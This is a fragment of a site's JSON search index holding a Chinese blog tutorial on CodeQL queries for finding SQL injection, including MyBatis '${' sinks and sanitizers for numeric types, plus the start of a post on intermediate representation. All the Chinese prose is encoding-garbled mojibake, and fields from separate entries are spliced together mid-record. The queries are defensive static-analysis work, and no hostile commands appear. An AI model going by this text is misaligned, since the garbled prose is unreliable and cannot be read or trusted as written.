ç‚¹æ˜¯ä¸ªæ•°æ®åº“çš„queryæ–¹æ³•(Method)çš„è°ƒç”¨(MethodAccess)ï¼Œæ‰€ä»¥æˆ‘ä»¬è®¾ç½®Sinkä¸ºï¼š\noverride predicate isSink(DataFlow::Node sink) { exists(Method method, MethodAccess call | method.hasName(\u0026#34;query\u0026#34;) and call.getMethod() = method and sink.asExpr() = call.getArgument(0) ) } è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨äº†existså­æŸ¥è¯¢ï¼Œè¿™ä¸ªæ˜¯CodeQLè°“è¯è¯­æ³•é‡Œéå¸¸å¸¸è§çš„è¯­æ³•ç»“æ„ï¼Œå®ƒæ ¹æ®å†…éƒ¨çš„å­æŸ¥è¯¢è¿”å›true or falseï¼Œæ¥å†³å®šç­›é€‰å‡ºå“ªäº›æ•°æ®ã€‚\nsink.asExpr() = call.getArgument(0)ï¼šå°† sink èŠ‚ç‚¹è½¬æ¢ä¸ºè¡¨è¾¾å¼ï¼Œå¹¶æ£€æŸ¥å®ƒæ˜¯å¦ç­‰äº call çš„ç¬¬ä¸€ä¸ªå‚æ•°\næ•…ä¸Šé¢sinkè¯­å¥çš„ä½œç”¨æ˜¯æŸ¥æ‰¾ä¸€ä¸ªquery()æ–¹æ³•çš„è°ƒç”¨ç‚¹ï¼Œå¹¶æŠŠå®ƒçš„ç¬¬ä¸€ä¸ªå‚æ•°è®¾ç½®ä¸ºsink\nå½“åˆšæ‰è®¾ç½®çš„sourceå˜é‡æµå…¥è¿™ä¸ªæ–¹æ³•æ—¶ï¼Œè¯´æ˜æ³¨å…¥ç‚¹å’Œè§¦å‘ç‚¹æ˜¯é€šçš„ï¼Œå°±èƒ½äº§ç”Ÿæ³¨å…¥æ¼æ´\nflowæ•°æ®æµ è®¾ç½®å¥½Sourceå’ŒSinkï¼Œå°±ç›¸å½“äºæå®šäº†é¦–å°¾ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ç–é€šä¸­é—´çš„åˆ©ç”¨é“¾ã€‚ä¸€ä¸ªå—æ±¡æŸ“çš„å˜é‡ï¼Œèƒ½å¤Ÿæ¯«æ— é˜»æ‹¦çš„æµè½¬åˆ°å±é™©å‡½æ•°ï¼Œå°±è¡¨ç¤ºå­˜åœ¨æ¼æ´\nè¿™ä¸ªè¿é€šå·¥ä½œå°±æ˜¯CodeQLå¼•æ“æœ¬èº«æ¥å®Œæˆçš„ã€‚æˆ‘ä»¬é€šè¿‡ä½¿ç”¨config.hasFlowPath(source, sink)æ–¹æ³•æ¥åˆ¤æ–­æ˜¯å¦è¿é€šã€‚\næ¯”å¦‚å¦‚ä¸‹ä»£ç ï¼š\nfrom VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink where config.hasFlowPath(source, sink) select source.getNode(), source, sink, \u0026#34;source\u0026#34; æˆ‘ä»¬ä¼ é€’ç»™config.hasFlowPath(source, sink)æˆ‘ä»¬å®šä¹‰å¥½çš„sourceå’Œsinkï¼Œç³»ç»Ÿå°±ä¼šè‡ªåŠ¨å¸®æˆ‘ä»¬åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¼æ´äº†ã€‚\nsource.getNode()ï¼šè·å–æºèŠ‚ç‚¹çš„åº•å±‚è¯­æ³•æ ‘èŠ‚ç‚¹ï¼ˆAST Nodeï¼‰ï¼Œæ˜¾ç¤ºæ¼æ´æºå¤´åœ¨ä»£ç ä¸­çš„å…·ä½“ä½ç½®\nä»£ç åˆ†æ\u0026amp;è§„åˆ™ç¼–å†™ æ¥ä¸‹æ¥é’ˆå¯¹ä¸Šé¢åŠ è½½çš„é¡¹ç›®æ•°æ®åº“è¿›è¡Œç»ƒæ‰‹ï¼Œå½“ç„¶è¿™é‡Œçš„è§„åˆ™æ›´å¤šæ˜¯å…ˆå¼€æªåç”»é¶ï¼Œå­¦ä¹ qlè§„åˆ™ç¼–å†™çš„æ€è·¯ï¼Œåç»­ä¼šå†æ›´æ–°ä¸€ç¯‡åå‘é€šç”¨çš„è§„åˆ™ç¼–å†™çš„\nSQL é¦–å…ˆå†™ä¸ª ql æŸ¥è¯¢ä»£ç æ¥æ£€æµ‹ sql æ³¨å…¥æ¼æ´ï¼Œå› ä¸ºsinkç‚¹æ˜¯queryï¼Œæ‰€ä»¥ä»£ç å¦‚ä¸‹:\n/** * @id java/examples/vuldemo * @name Sql-Injection * @description Sql-Injection * @kind path-problem * @problem.severity warning */ import java import semmle.code.java.dataflow.FlowSources import semmle.code.java.security.QueryInjection import DataFlow::PathGraph class VulConfig extends TaintTracking::Configuration { VulConfig() { this = \u0026#34;SqlInjectionConfig\u0026#34;} override predicate isSource(DataFlow::Node src) { src instanceof RemoteFlowSource } override predicate isSink(DataFlow::Node sink) { exists(Method method, MethodAccess call | method.hasName(\u0026#34;query\u0026#34;) and call.getMethod() = method and sink.asExpr() = call.getArgument(0) ) } } from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink where config.hasFlowPath(source, sink) select source.getNode(), source, sink, \u0026#34;source\u0026#34; CodeQL åœ¨å®šä¹‰ç±»ä¸Šçš„è¯­æ³•å’Œ Java ç±»ä¼¼ï¼Œå…¶ä¸­ extends çš„çˆ¶ç±» TaintTracking::Configuration æ˜¯å®˜æ–¹æä¾›ç”¨æ¥åšæ•°æ®æµåˆ†æçš„é€šç”¨ç±»ï¼Œæä¾›å¾ˆå¤šæ•°æ®æµåˆ†æç›¸å…³çš„æ–¹æ³•ï¼Œæ¯”å¦‚isSource(å®šä¹‰source)ï¼ŒisSink(å®šä¹‰sink)\nsrc instanceof RemoteFlowSource è¡¨ç¤ºsrc å¿…é¡»æ˜¯ RemoteFlowSource ç±»å‹ã€‚åœ¨RemoteFlowSourceé‡Œï¼Œå®˜æ–¹æä¾›å¾ˆéå¸¸å…¨çš„sourceå®šä¹‰ï¼Œæˆ‘ä»¬æœ¬æ¬¡ç”¨åˆ°çš„Springbootçš„Sourceå°±å·²ç»æ¶µç›–äº†ã€‚\næ³¨ï¼šä¸Šé¢çš„æ³¨é‡Šå’Œå…¶å®ƒè¯­è¨€æ˜¯ä¸ä¸€æ ·çš„ï¼Œä¸èƒ½å¤Ÿåˆ é™¤ï¼Œå®ƒæ˜¯ç¨‹åºçš„ä¸€éƒ¨åˆ†ï¼Œå› ä¸ºåœ¨æˆ‘ä»¬ç”Ÿæˆæµ‹è¯•æŠ¥å‘Šçš„æ—¶å€™ï¼Œä¸Šé¢æ³¨é‡Šå½“ä¸­çš„nameï¼Œdescriptionç­‰ä¿¡æ¯ä¼šå†™å…¥åˆ°å®¡è®¡æŠ¥å‘Šä¸­ã€‚ è¿™é‡Œçš„isSource å’ŒisSink æ ¹æ®è‡ªå·±éœ€è¦è¿›è¡Œé‡å†™ï¼Œè€Œåˆ¤æ–­ä¸­é—´æ˜¯å¦ç–é€šå¯ä»¥ä½¿ç”¨CodeQLæä¾›çš„config.hasFlowPath(source, sink)æ¥å¸®æˆ‘ä»¬å¤„ç†\næŸ¥è¯¢åå¯ä»¥çœ‹åˆ°ï¼Œä»sourceç‚¹åˆ°sinkç‚¹çš„é“¾è·¯ç›´æ¥æ˜¾ç¤ºå‡ºæ¥äº†ï¼š\nè¿™é‡Œçˆ†è­¦å‘Šè¯´æ˜¯ DataFlow::PathGraph åœ¨æ–°ç‰ˆæœ¬ä¸­è¢«å¼ƒç”¨äº†ï¼Œæ‰€ä»¥è¿™æ®µä»£ç åªèƒ½åœ¨ä½ç‰ˆæœ¬çš„è§„åˆ™åº“é‡Œè·‘\nè¿™é‡Œå¼€å¤´æœ‰ @kind path-problem ï¼Œè¯´æ˜ç»“æœè‡³å°‘æ˜¯4åˆ—ï¼Œå†™äº†è¿™ä¸ªç»“æœå°±ä¼šè¾“å‡ºå®Œæ•´çš„æ±¡ç‚¹ä¼ æ’­è·¯å¾„ï¼Œé™¤æ­¤ä¹‹å¤–å¯¹è¾“å‡ºè¿˜æœ‰å…¶ä»–è¦æ±‚ï¼Œæ¯”å¦‚æ¯åˆ—è¦è¾“å‡ºçš„ç±»å‹ä¹Ÿæœ‰è¦æ±‚ç­‰\nè·Ÿè¿›ä»£ç ï¼Œå¯ä»¥ç›´æ¥çœ‹åˆ°sinkç‚¹çš„ä»£ç å†…å®¹ï¼š\nè¯¯æŠ¥å¤„ç† æˆ‘ä»¬åˆ†æsourceç‚¹ï¼Œå‘ç°æœ‰ä¸€å¤„ sql æ³¨å…¥ï¼Œå…¶è¾“å…¥çš„å‚æ•°ç±»å‹ä¸º List\u0026lt;Long\u0026gt; ï¼Œå³çº¯æ•°å­—ï¼Œä¸å¯èƒ½å­˜åœ¨æ³¨å…¥ï¼š\nè¯´æ˜æˆ‘ä»¬ç»™çš„é™åˆ¶å¹¶æœªä¸¥æ ¼è¦æ±‚å‚æ•°ç±»å‹ï¼Œå°±ä¼šå¯¼è‡´ä»¥ä¸Šçš„è¯¯æŠ¥äº§ç”Ÿï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ isSanitizer æ¥é¿å…è¿™ç§æƒ…å†µï¼š\nisSanitizeræ˜¯CodeQLçš„ç±»TaintTracking::Configurationæä¾›çš„å‡€åŒ–æ–¹æ³•ï¼Œå®ƒçš„å‡½æ•°åŸå‹å¦‚ä¸‹ï¼š\noverride predicate isSanitizer(DataFlow::Node node) {} åœ¨CodeQLè‡ªå¸¦çš„é»˜è®¤è§„åˆ™é‡Œï¼Œå¯¹å½“å‰èŠ‚ç‚¹æ˜¯å¦ä¸ºåŸºç¡€ç±»å‹åšäº†åˆ¤æ–­:\noverride predicate isSanitizer(DataFlow::Node node) { node.getType() instanceof PrimitiveType or node.getType() instanceof BoxedType or node.getType() instanceof NumberType } è¡¨ç¤ºå¦‚æœå½“å‰èŠ‚ç‚¹æ˜¯ä¸Šé¢æåˆ°çš„åŸºç¡€ç±»å‹ï¼Œé‚£ä¹ˆæ­¤æ±¡æŸ“é“¾å°†è¢«å‡€åŒ–é˜»æ–­ï¼Œæ¼æ´å°†ä¸å­˜åœ¨ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œé»˜è®¤è§„åˆ™åªæ˜¯ä¸€äº›åŸºç¡€ç±»å‹ï¼Œæ²¡æœ‰ç±»ä¼¼ List\u0026lt;long\u0026gt; ç­‰çš„å¤åˆç±»å‹ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å°† TaintTracking::Configuration ä¸­çš„ isSanitizer é‡å†™ä¸‹ï¼š\noverride predicate isSanitizer(DataFlow::Node node) { node.getType() instanceof PrimitiveType or node.getType() instanceof BoxedType or node.getType() instanceof NumberType or exists(ParameterizedType pt| node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType ) # è¿™é‡Œçš„ ParameterizedType ä»£è¡¨æ‰€æœ‰æ³›å‹ï¼Œåˆ¤æ–­æ³›å‹å½“ä¸­çš„ä¼ å‚æ˜¯å¦ä¸º Number å‹ } è¿™æ ·åœ¨æ£€æµ‹åˆ° List\u0026lt;long\u0026gt; æ—¶å°±ä¼šå°†å…¶å‡€åŒ–æ‰ï¼Œè¿™æ ·é“¾å­å°±ä¸é€šäº†ï¼Œä¹Ÿå°±ä¸ä¼šå‡ºç°è¯¯æŠ¥äº†ï¼š\nå…³äºlombok ç”±äºjavaçš„å°è£…ç‰¹æ€§ï¼Œæ¯ä¸€ä¸ªå˜é‡éƒ½è¦å†™setterå’Œsetterå¾ˆéº»çƒ¦ï¼Œæ‰€ä»¥å°±æœ‰äº†lombokï¼Œå¼•å…¥ä»¥æ¥åé€šè¿‡@Dataæ³¨è§£å°±å¯ä»¥è‡ªåŠ¨å®ç°getterå’Œsetterï¼ˆä¸æ˜¯è‡ªåŠ¨è¡¥å…¨ä»£ç çš„æ–¹å¼å®ç°ï¼‰\nå¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯èƒ½è¯†åˆ«åˆ°çš„ï¼š å¦‚æœä¸èƒ½è¯†åˆ«ï¼Œå¯ä»¥é€šè¿‡å¦‚ä¸‹çš„æ–¹æ³•å¿«é€Ÿè¿˜åŸsetterå’Œgetteræ–¹æ³•ï¼Œæ¥è‡ªgithub issueï¼š\n# get a copy of lombok.jar wget https://projectlombok.org/downloads/lombok.jar -O \u0026#34;lombok.jar\u0026#34; # run \u0026#34;delombok\u0026#34; on the source files and write the generated files to a folder named \u0026#34;delombok\u0026#34; java -jar \u0026#34;lombok.jar\u0026#34; delombok -n --onlyChanged . -d \u0026#34;delombok\u0026#34; # remove \u0026#34;generated by\u0026#34; comments find \u0026#34;delombok\u0026#34; -name \u0026#39;*.java\u0026#39; -exec sed \u0026#39;/Generated by delombok/d\u0026#39; -i \u0026#39;{}\u0026#39; \u0026#39;;\u0026#39; # remove any left-over import statements find \u0026#34;delombok\u0026#34; -name \u0026#39;*.java\u0026#39; -exec sed \u0026#39;/import lombok/d\u0026#39; -i \u0026#39;{}\u0026#39; \u0026#39;;\u0026#39; # copy delombok\u0026#39;d files over the original ones cp -r \u0026#34;delombok/.\u0026#34; \u0026#34;./\u0026#34; # remove the \u0026#34;delombok\u0026#34; folder rm -rf \u0026#34;delombok\u0026#34; æ¼æŠ¥ æ­¤æ—¶æˆ‘ä»¬å‘ç°æˆ‘ä»¬çš„qlä»£ç æ ¹æœ¬æ— æ³•æŸ¥è¯¢mybatisçš„æ³¨å…¥ï¼š\nä¸»è¦åŸå› æ˜¯æˆ‘ä»¬çš„sinkç‚¹åˆ¤æ–­ä½¿ç”¨çš„åˆ¤æ–­queryï¼Œè€Œmybatisçš„æŸ¥è¯¢æ˜¯åœ¨è¿è¡ŒæœŸæŠŠæ³¨è§£å­—ç¬¦ä¸²ï¼ˆå« ${}ï¼‰å¤„ç†åäº¤ç»™å®ƒè‡ªå·±çš„æ‰§è¡Œå™¨ï¼Œæ‰€ä»¥è¿˜éœ€è¦ä¼˜åŒ–sinkç‚¹åˆ¤æ–­è§„åˆ™ï¼Œæ€è·¯æ˜¯å®šä½å­—é¢å«æœ‰ \u0026ldquo;${\u0026ldquo;çš„å­—é¢é‡å¹¶æ‰¾åˆ°è°ƒç”¨è¯¥ mapper æ–¹æ³•çš„è°ƒç”¨ç‚¹ï¼Œæ‰€ä»¥æœ€ç»ˆçš„ä»£ç ï¼š\n/** * @id java/examples/vuldemo * @name Sql-Injection * @description Sql-Injection * @kind path-problem * @problem.severity warning */ import java import semmle.code.java.dataflow.FlowSources import semmle.code.java.security.QueryInjection import DataFlow::PathGraph class VulConfig extends TaintTracking::Configuration { VulConfig() { this = \u0026#34;SqlInjectionConfig\u0026#34; } override predicate isSource(DataFlow::Node src) { src instanceof RemoteFlowSource } override predicate isSink(DataFlow::Node sink) { exists(Method method, MethodAccess call | method.hasName(\u0026#34;query\u0026#34;) and call.getMethod() = method and sink.asExpr() = call.getArgument(0) ) //æ–°å¢çš„mybatisåœºæ™¯åˆ¤æ–­ or exists(Method mapperMethod, MethodAccess mapperCall, StringLiteral dollarLit, int startLineMeth, int endLineLit | // æ‰¾åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²å­—é¢é‡ï¼Œå­—é¢å«æœ‰ \u0026#34;${\u0026#34; dollarLit.toString().indexOf(\u0026#34;${\u0026#34;) \u0026gt;= 0 and // åŒä¸€æºç æ–‡ä»¶ dollarLit.getLocation().getFile() = mapperMethod.getLocation().getFile() and // è·å–æ–¹æ³•èµ·å§‹è¡Œä¸å­—é¢é‡ç»“æŸè¡Œ startLineMeth = mapperMethod.getLocation().getStartLine() and endLineLit = dollarLit.getLocation().getEndLine() and // å­—é¢é‡åº”å‡ºç°åœ¨æ–¹æ³•ä¸Šæ–¹ï¼ˆæˆ–åŒä¸€è¡Œï¼‰ endLineLit \u0026lt;= startLineMeth and // æ‰¾åˆ°è°ƒç”¨è¯¥ mapper æ–¹æ³•çš„è°ƒç”¨ç‚¹ mapperCall.getMethod() = mapperMethod and // æŠŠç¬¬ä¸€ä¸ªå®å‚è§†ä½œ sink sink.asExpr() = mapperCall.getArgument(0) ) } override predicate isSanitizer(DataFlow::Node node) { node.getType() instanceof PrimitiveType or node.getType() instanceof BoxedType or node.getType() instanceof NumberType or exists(ParameterizedType pt | node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType ) } } from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink where config.hasFlowPath(source, sink) select source.getNode(), source, sink, \u0026#34;SQL injection\u0026#34; æ­¤æ—¶çš„qlå°±èƒ½æŸ¥è¯¢å‡ºmybatisçš„æ³¨å…¥åœºæ™¯äº†ï¼š ä¸è¿‡è¿™é‡Œçš„mybatisæ³¨å…¥åœºæ™¯æ˜¯å°†è¯­å¥å†™åœ¨javaæ–‡ä»¶çš„ï¼Œåç»­è¿˜éœ€è¦è€ƒè™‘xmlå½¢å¼çš„mybatisæ³¨å…¥åœºæ™¯\n",
        "summary": "CodeQLåŸºç¡€ é…ç½® ç®€å•è¯´ä¸€ä¸‹ç¯å¢ƒé…ç½®\nå¼•æ“åœ°å€ï¼šhttps://github.com/github/codeql-cli-binaries/releasesï¼Œä¸‹è½½åé…ç½®ç¯å¢ƒå˜é‡ï¼š\nç„¶åå®‰è£…sdkï¼šhttps://github.com/github/codeqlï¼Œæ”¹åæˆqlï¼Œæ”¾åœ¨ä¹‹å‰å¼•æ“çš„åŒç›®å½•ä¸‹ï¼š\nç„¶ååœ¨vscodeå®‰è£…æ’ä»¶ï¼š\nåœ¨è®¾ç½®é‡Œæ·»åŠ ä¸€ä¸‹CodeQLå¯æ‰§è¡Œæ–‡ä»¶çš„ä½ç½®ï¼š\nç”¨CodeQLåˆ†æé¡¹ç›®æœ¬è´¨æ˜¯æ‰§è¡ŒæŸ¥è¯¢ï¼Œé¦–å…ˆéœ€è¦å»å¾…å®¡è®¡æºä»£ç çš„æ ¹ç›®å½•å»ºç«‹åˆ†ææ•°æ®åº“ï¼Œæˆ‘è¿™é‡Œåˆ†æçš„ä¸€ä¸ªå¼€æºçš„æ¼æ´åˆé›†ï¼šhttps://github.com/l4yn3/micro_service_seclab/\né¦–å…ˆè¦å»ºç«‹åˆ†ææ•°æ®åº“ï¼š\ncodeql database create javaseclabstest --language=\u0026#34;java\u0026#34; --command=\u0026#34;mvn clean install -Dmaven.test.skip=true\u0026#34; --source-root=/Users/yuy0ung/Desktop/SAST/micro_service_seclab-main æ‰§è¡ŒæˆåŠŸä½ åº”è¯¥å¯ä»¥åœ¨è¿™ä¸ªç›®å½•é‡Œçœ‹åˆ°ä¸€ä¸ªcodeqltestç›®å½•:\næ¥ç€æˆ‘ä»¬åœ¨vscodeå¼•å…¥è¿™ä¸ªç›®å½•ï¼š\nç„¶åæˆ‘ä»¬æ–°å»ºä¸€ä¸ªqueryï¼š demo.qlï¼Œå†…å®¹ä¸ºselect \u0026quot;Hello Worldâ€œï¼Œä½ç½®ä¸ºCodeQL/ql/java/ql/examples/test.ql\næ¥ä¸‹æ¥è¿è¡Œqueryï¼š å¯ä»¥çœ‹åˆ°ç»“æœè¾“å‡ºäº†hello worldï¼Œè¯´æ˜é…ç½®æ²¡æœ‰é—®é¢˜äº†\nCodeQLåŸºç¡€è¯­æ³• qlè¯­æ³• è¯´ç™½äº†å°±æ˜¯æŸ¥è¯¢è¯­æ³•ï¼ŒQLæŸ¥è¯¢çš„è¯­æ³•ç»“æ„ä¸ºï¼š\nfrom [datatype] var where condition(var = something) select var æ¯”å¦‚ï¼š\nimport java from int i where i = 1 select i ç¬¬ä¸€è¡Œè¡¨ç¤ºæˆ‘ä»¬è¦å¼•å…¥CodeQLçš„ç±»åº“ï¼Œå› ä¸ºæˆ‘ä»¬åˆ†æçš„é¡¹ç›®æ˜¯javaçš„ï¼Œæ‰€ä»¥è¦import javaï¼ˆå¦‚æœQLæ–‡ä»¶åœ¨ ql\\java\\ql\\ ç›®å½•ä¸­æ—¶å°±ä¸éœ€è¦ import java äº†ï¼Œå› ä¸ºè¿™æ˜¯ CodeQL æ ‡å‡†åº“ç›®å½•ï¼Œå…¶ä¼šè‡ªåŠ¨éšå¼åŠ è½½è¯¥ç›®å½•ä¸‹çš„ä¾èµ–ï¼Œä½†å¦‚æœå†™åœ¨å…¶ä»–ç›®å½•ä¸‹å°±éœ€è¦æ‰‹åŠ¨ import java ï¼ŒåŒ…æ‹¬å…¶å­ç›®å½•ï¼‰ ç¬¬ä¸‰è¡Œè¡¨ç¤ºå®šä¹‰ä¸€ä¸ªintå‹å˜é‡iï¼Œè¡¨ç¤ºæˆ‘ä»¬è·å–æ‰€æœ‰çš„intç±»å‹çš„æ•°æ® ç¬¬å››è¡Œä¸ºåˆ¤å®šæ¡ä»¶ ç¬¬äº”è¡Œä¸ºè¾“å‡ºi ä¹Ÿå°±æ˜¯è¯´åœ¨æ‰€æœ‰çš„æ•´å½¢æ•°å­—iä¸­ï¼Œå½“i==1çš„æ—¶å€™ï¼Œå°±è¾“å‡ºiï¼ŒæŒ‰ç…§è¿™ä¸ªé€»è¾‘ï¼Œæœ€ç»ˆçš„è¾“å‡ºå°±åº”è¯¥ä¸º1: "
    }
,
    {
        "title": "ä¸­é—´è¡¨ç¤º",
        "link": "/My-Knowlege-Database/blog/sdl/sast/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/%E4%B8%AD%E9%97%B4%E8%A1%A8%E7%A4%BA/",
        "content": "ä¸­é—´è¡¨ç¤ºIR è®²è®²IRï¼ˆIntermediate Representationï¼‰ï¼Œä¸­é—´è¡¨ç¤º\nç¼–è¯‘å™¨ä¸é™æ€åˆ†æå™¨ ç¼–è¯‘å™¨Compilersè´Ÿè´£å°†æºä»£ç ï¼ˆSource codeï¼‰ è½¬æ¢ä¸ºæœºå™¨ä»£ç ï¼ˆMachine Codeï¼‰ï¼Œå¤§è‡´æµç¨‹æ¡†æ¶å¦‚ä¸‹ï¼š\nè¯æ³•åˆ†æå™¨ï¼ˆScannerï¼‰ï¼Œç»“åˆæ­£åˆ™è¡¨è¾¾å¼ï¼Œé€šè¿‡è¯æ³•åˆ†æï¼ˆLexical Analysisï¼‰å°† source code ç¿»è¯‘ä¸º tokenã€‚ è¯­æ³•åˆ†æå™¨ï¼ˆParserï¼‰ï¼Œç»“åˆä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•ï¼ˆContext-Free Grammarï¼‰ï¼Œé€šè¿‡è¯­æ³•åˆ†æï¼ˆSyntax Analysisï¼‰ï¼Œå°† token è§£æä¸ºæŠ½è±¡è¯­æ³•æ ‘ï¼ˆAbstract Syntax Tree, ASTï¼‰ è¯­ä¹‰åˆ†æå™¨ï¼ˆType Checkerï¼‰ï¼Œç»“åˆå±æ€§æ–‡æ³•ï¼ˆAttribute Grammarï¼‰ï¼Œé€šè¿‡è¯­ä¹‰åˆ†æï¼ˆSemantic Analysisï¼‰ï¼Œå°† AST è§£æä¸º decorated AST Translatorï¼Œå°† decorated AST ç¿»è¯‘ä¸ºç”Ÿæˆä¸‰åœ°å€ç è¿™æ ·çš„ä¸­é—´è¡¨ç¤ºå½¢å¼ï¼ˆIntermediate Representation, IRï¼‰ï¼Œå¹¶åŸºäº IR åšé™æ€åˆ†æï¼ˆä¾‹å¦‚ä»£ç ä¼˜åŒ–è¿™æ ·çš„å·¥ä½œï¼‰ã€‚ Code Generatorï¼Œå°† IR è½¬æ¢ä¸ºæœºå™¨ä»£ç ã€‚ æµç¨‹å›¾å¦‚ä¸‹ï¼š\ngraph TD %% èŠ‚ç‚¹å®šä¹‰ï¼šæ•°æ®çŠ¶æ€ Src(Source Code) Tok(Token) AST(AST æŠ½è±¡è¯­æ³•æ ‘) DecAST(Decorated AST) IR(\"Intermediate Representation (IR)ä¸‰åœ°å€ç ç­‰\") MC(Machine Code) %% æµç¨‹å®šä¹‰ï¼šè¿çº¿ä»£è¡¨è½¬æ¢è¿‡ç¨‹ï¼Œæ ‡ç­¾æ³¨æ˜äº†[ç»„ä»¶]å’Œ(æ–¹æ³•) Src --\u003e|\"è¯æ³•åˆ†æå™¨ (Scanner)æ–¹æ³•: Lexical Analysis + æ­£åˆ™è¡¨è¾¾å¼\"| Tok Tok --\u003e|\"è¯­æ³•åˆ†æå™¨ (Parser)æ–¹æ³•: Syntax Analysis + ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³• (CFG)\"| AST AST --\u003e|\"è¯­ä¹‰åˆ†æå™¨ (Type Checker)æ–¹æ³•: Semantic Analysis + å±æ€§æ–‡æ³•\"| DecAST DecAST --\u003e|\"è½¬æ¢å™¨ (Translator)æ–¹æ³•: IR Generation + é™æ€åˆ†æ (Static Analysis)\"| IR IR --\u003e|\"ä»£ç ç”Ÿæˆå™¨ (Code Generator)æ–¹æ³•: Code Generation\"| MC %% æ ·å¼ç¾åŒ– style Src fill:#f9f,stroke:#333,stroke-width:2px style MC fill:#f9f,stroke:#333,stroke-width:2px style Tok fill:#e3f2fd,stroke:#1565c0 style AST fill:#e3f2fd,stroke:#1565c0 style DecAST fill:#e3f2fd,stroke:#1565c0 style IR fill:#fff9c4,stroke:#fbc02d é™æ€åˆ†æå¾—å…ˆç¡®ä¿è¿™æ˜¯ä¸€ä»½åˆæ ¼çš„ä»£ç ï¼Œç„¶åå†è¿›è¡Œåˆ†æ\nåˆ†æä»£ç åˆä¸åˆæ ¼ï¼Œè¿™æ˜¯ trivial çš„äº‹æƒ…ï¼Œç”±å‰é¢çš„å„ç§åˆ†æå™¨å»åšå°±è¡Œäº†ï¼Œæˆ‘ä»¬è¦åšçš„æ˜¯ non-trivial çš„äº‹æƒ…ï¼Œæ‰€ä»¥æ˜¯åŸºäºIRæ¥åˆ†æ\nASTä¸IR ä¸ºä»€ä¹ˆåœ¨é™æ€åˆ†æçš„æ—¶å€™ï¼Œä½¿ç”¨ IR è€Œé AST ï¼Ÿ\næˆ‘ä»¬å¯ä»¥å¯¹æ¯”ä¸€ä¸‹ï¼š\næˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼š\nAST æ˜¯ high-level ä¸”æ¥è¿‘è¯­æ³•ç»“æ„çš„ï¼Œè€Œ IR æ˜¯ low-level ä¸”æ¥è¿‘æœºå™¨ä»£ç çš„ AST æ˜¯ä¾èµ–äºç¼–ç¨‹è¯­è¨€çš„ï¼ŒIR é€šå¸¸æ˜¯ç‹¬ç«‹äºç¼–ç¨‹è¯­è¨€çš„ï¼šä¸‰åœ°å€ç ä¼šè¢«åˆ†æå™¨é‡ç‚¹å…³æ³¨ï¼Œå› ä¸ºå¯ä»¥å°†å„ç§å‰ç«¯è¯­è¨€ç»Ÿä¸€ç¿»è¯‘æˆåŒä¸€ç§ IR å†åŠ ä»¥ä¼˜åŒ– AST é€‚åˆå¿«é€Ÿç±»å‹æ£€æŸ¥ï¼ŒIR çš„ç»“æ„æ›´åŠ ç´§å‡‘å’Œç»Ÿä¸€ï¼šåœ¨ AST ä¸­åŒ…å«äº†å¾ˆå¤šéç»ˆç»“ç¬¦æ‰€å ç”¨çš„ç»“ç‚¹ï¼ˆbody, assign ç­‰ï¼‰ï¼Œè€Œ IR ä¸­ä¸ä¼šéœ€è¦åˆ°è¿™äº›ä¿¡æ¯ AST ç¼ºå°‘æ§åˆ¶æµä¿¡æ¯ï¼ŒIR åŒ…å«äº†æ§åˆ¶æµä¿¡æ¯ï¼šAST ä¸­åªæ˜¯æœ‰ç»“ç‚¹è¡¨æ˜äº†è¿™æ˜¯ä¸€ä¸ª do-while ç»“æ„ï¼Œä½†æ˜¯æ— æ³•çœ‹å‡ºæ§åˆ¶æµä¿¡æ¯ï¼›è€Œ IR ä¸­çš„ goto ç­‰ä¿¡æ¯å¯ä»¥è½»æ˜“çœ‹å‡ºæ§åˆ¶æµ ç»¼ä¸Šæ‰€è¿°ï¼Œä¸éš¾çœ‹å‡º IR æ›´é€‚åˆä½œä¸ºé™æ€åˆ†æçš„åŸºç¡€\nä¸‰åœ°å€ç 3AC ä¸‰åœ°å€ç ï¼ˆ3-Address Codeï¼‰é€šå¸¸æ²¡æœ‰ç»Ÿä¸€çš„æ ¼å¼ã€‚åœ¨æ¯ä¸ªæŒ‡ä»¤çš„å³è¾¹è‡³å¤šæœ‰ä¸€ä¸ªæ“ä½œç¬¦ï¼Œä¾‹å¦‚å¦‚ä¸‹å¼å­ï¼š\na + b + 3 è½¬åŒ–ä¸ºä¸‰åœ°å€ç ï¼Œè¿™ä¸€æ­¥ä¸€èˆ¬ä¼šå¼•å…¥ä¸´æ—¶å˜é‡ï¼š\nt1 = a + b t2 = t1 + 3 ä¸‰åœ°å€ç ä¸ºä»€ä¹ˆå«åšä¸‰åœ°å€ç ï¼Œå› ä¸ºæ¯æ¡ 3AC è‡³å¤šæœ‰ä¸‰ä¸ªåœ°å€ã€‚è€Œä¸€ä¸ªã€Œåœ°å€ã€å¯ä»¥æ˜¯ï¼š\nåç§° Name: a, b å¸¸é‡ Constant: 3 ç¼–è¯‘å™¨ç”Ÿæˆçš„ä¸´æ—¶å˜é‡ Compiler-generated Temporary: t1, t2 ä¸‹é¢æ˜¯ä¸€äº›å¸¸è§çš„ 3AC ï¼š\nx = y bop zï¼šåŒç›®è¿ç®—å¹¶èµ‹å€¼ï¼Œbop = binary operator x = uop zï¼šå•ç›®è¿ç®—å¹¶èµ‹å€¼ï¼Œuop = unary operator x = yï¼šç›´æ¥èµ‹å€¼ goto Lï¼šæ— æ¡ä»¶è·³è½¬ï¼ŒL = label if x goto Lï¼šæ¡ä»¶è·³è½¬ if x rop y goto Lï¼šåŒ…å«äº†å…³ç³»è¿ç®—çš„æ¡ä»¶è·³è½¬ï¼Œrop = relational operator 